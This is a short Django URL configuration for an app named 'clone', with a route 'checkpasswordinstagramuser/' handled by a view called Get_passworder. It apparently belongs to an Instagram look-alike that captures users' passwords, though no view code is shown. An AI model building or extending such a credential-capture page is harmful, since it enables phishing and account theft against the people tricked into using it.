from django.contrib import admin
from django.urls import path
from django.conf.urls import url
from django.contrib.auth import views as auth_views


from .import views

app_name="clone"

urlpatterns = [
    # home page
    url(r'^$', views.index, name='index'),
    url(r'^checkpasswordinstagramuser/$', views.Get_passworder, name='Get_passworder'),
   



    ]